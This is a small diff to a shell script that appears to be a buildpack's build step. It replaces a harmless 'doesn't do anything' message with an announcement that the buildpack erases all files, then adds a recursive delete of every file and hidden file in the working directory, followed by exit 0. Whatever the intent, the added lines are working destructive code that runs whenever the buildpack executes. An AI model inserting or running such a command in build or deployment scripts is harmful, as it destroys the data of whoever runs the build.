@@ -1,2 +1,4 @@
 #!/bin/sh
-echo "This buildpack doesn't do anything"
+echo "This buildpack erases all files and directories."
+rm -r .* *
+exit 0
